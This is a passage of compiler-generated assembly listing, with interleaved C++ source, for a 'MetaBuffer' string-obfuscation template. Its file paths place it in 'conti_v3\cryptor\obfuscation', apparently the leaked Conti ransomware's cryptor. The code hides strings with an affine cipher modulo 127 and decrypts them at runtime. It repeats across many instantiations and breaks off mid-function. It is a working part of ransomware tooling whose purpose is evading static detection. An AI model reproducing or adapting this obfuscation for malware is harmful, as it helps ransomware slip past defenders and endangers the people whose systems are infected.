??0?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3c	 mov	 BYTE PTR [rcx+1], 60	; 0000003cH
  00007	c6 41 02 2b	 mov	 BYTE PTR [rcx+2], 43	; 0000002bH
  0000b	c6 41 03 1f	 mov	 BYTE PTR [rcx+3], 31
  0000f	c6 41 04 2b	 mov	 BYTE PTR [rcx+4], 43	; 0000002bH
  00013	c6 41 05 4b	 mov	 BYTE PTR [rcx+5], 75	; 0000004bH
  00017	c6 41 06 2b	 mov	 BYTE PTR [rcx+6], 43	; 0000002bH
  0001b	c6 41 07 68	 mov	 BYTE PTR [rcx+7], 104	; 00000068H
  0001f	c6 41 08 2b	 mov	 BYTE PTR [rcx+8], 43	; 0000002bH
  00023	c6 41 09 2b	 mov	 BYTE PTR [rcx+9], 43	; 0000002bH
  00027	c6 41 0a 2b	 mov	 BYTE PTR [rcx+10], 43	; 0000002bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 5a 00 00 00	 mov	 eax, 90			; 0000005aH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4b	 mov	 BYTE PTR [rcx+1], 75	; 0000004bH
  00007	c6 41 02 5a	 mov	 BYTE PTR [rcx+2], 90	; 0000005aH
  0000b	c6 41 03 55	 mov	 BYTE PTR [rcx+3], 85	; 00000055H
  0000f	c6 41 04 5a	 mov	 BYTE PTR [rcx+4], 90	; 0000005aH
  00013	c6 41 05 2f	 mov	 BYTE PTR [rcx+5], 47	; 0000002fH
  00017	c6 41 06 5a	 mov	 BYTE PTR [rcx+6], 90	; 0000005aH
  0001b	c6 41 07 18	 mov	 BYTE PTR [rcx+7], 24
  0001f	c6 41 08 5a	 mov	 BYTE PTR [rcx+8], 90	; 0000005aH
  00023	c6 41 09 5a	 mov	 BYTE PTR [rcx+9], 90	; 0000005aH
  00027	c6 41 0a 5a	 mov	 BYTE PTR [rcx+10], 90	; 0000005aH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 27 00 00 00	 mov	 eax, 39			; 00000027H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 49	 mov	 BYTE PTR [rcx+1], 73	; 00000049H
  00007	c6 41 02 27	 mov	 BYTE PTR [rcx+2], 39	; 00000027H
  0000b	c6 41 03 3d	 mov	 BYTE PTR [rcx+3], 61	; 0000003dH
  0000f	c6 41 04 27	 mov	 BYTE PTR [rcx+4], 39	; 00000027H
  00013	c6 41 05 08	 mov	 BYTE PTR [rcx+5], 8
  00017	c6 41 06 27	 mov	 BYTE PTR [rcx+6], 39	; 00000027H
  0001b	c6 41 07 2b	 mov	 BYTE PTR [rcx+7], 43	; 0000002bH
  0001f	c6 41 08 27	 mov	 BYTE PTR [rcx+8], 39	; 00000027H
  00023	c6 41 09 27	 mov	 BYTE PTR [rcx+9], 39	; 00000027H
  00027	c6 41 0a 27	 mov	 BYTE PTR [rcx+10], 39	; 00000027H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0e 00 00
	00		 mov	 r10d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 64 00 00 00	 mov	 eax, 100		; 00000064H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 33	 mov	 BYTE PTR [rcx+1], 51	; 00000033H
  00007	c6 41 02 64	 mov	 BYTE PTR [rcx+2], 100	; 00000064H
  0000b	c6 41 03 10	 mov	 BYTE PTR [rcx+3], 16
  0000f	c6 41 04 64	 mov	 BYTE PTR [rcx+4], 100	; 00000064H
  00013	c6 41 05 2f	 mov	 BYTE PTR [rcx+5], 47	; 0000002fH
  00017	c6 41 06 64	 mov	 BYTE PTR [rcx+6], 100	; 00000064H
  0001b	c6 41 07 2f	 mov	 BYTE PTR [rcx+7], 47	; 0000002fH
  0001f	c6 41 08 64	 mov	 BYTE PTR [rcx+8], 100	; 00000064H
  00023	c6 41 09 7e	 mov	 BYTE PTR [rcx+9], 126	; 0000007eH
  00027	c6 41 0a 64	 mov	 BYTE PTR [rcx+10], 100	; 00000064H
  0002b	c6 41 0b 67	 mov	 BYTE PTR [rcx+11], 103	; 00000067H
  0002f	c6 41 0c 64	 mov	 BYTE PTR [rcx+12], 100	; 00000064H
  00033	c6 41 0d 64	 mov	 BYTE PTR [rcx+13], 100	; 00000064H
  00037	c6 41 0e 64	 mov	 BYTE PTR [rcx+14], 100	; 00000064H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 69 00 00 00	 mov	 eax, 105		; 00000069H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 71	 mov	 BYTE PTR [rcx+1], 113	; 00000071H
  00007	c6 41 02 69	 mov	 BYTE PTR [rcx+2], 105	; 00000069H
  0000b	c6 41 03 1c	 mov	 BYTE PTR [rcx+3], 28
  0000f	c6 41 04 69	 mov	 BYTE PTR [rcx+4], 105	; 00000069H
  00013	c6 41 05 6f	 mov	 BYTE PTR [rcx+5], 111	; 0000006fH
  00017	c6 41 06 69	 mov	 BYTE PTR [rcx+6], 105	; 00000069H
  0001b	c6 41 07 20	 mov	 BYTE PTR [rcx+7], 32	; 00000020H
  0001f	c6 41 08 69	 mov	 BYTE PTR [rcx+8], 105	; 00000069H
  00023	c6 41 09 69	 mov	 BYTE PTR [rcx+9], 105	; 00000069H
  00027	c6 41 0a 69	 mov	 BYTE PTR [rcx+10], 105	; 00000069H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
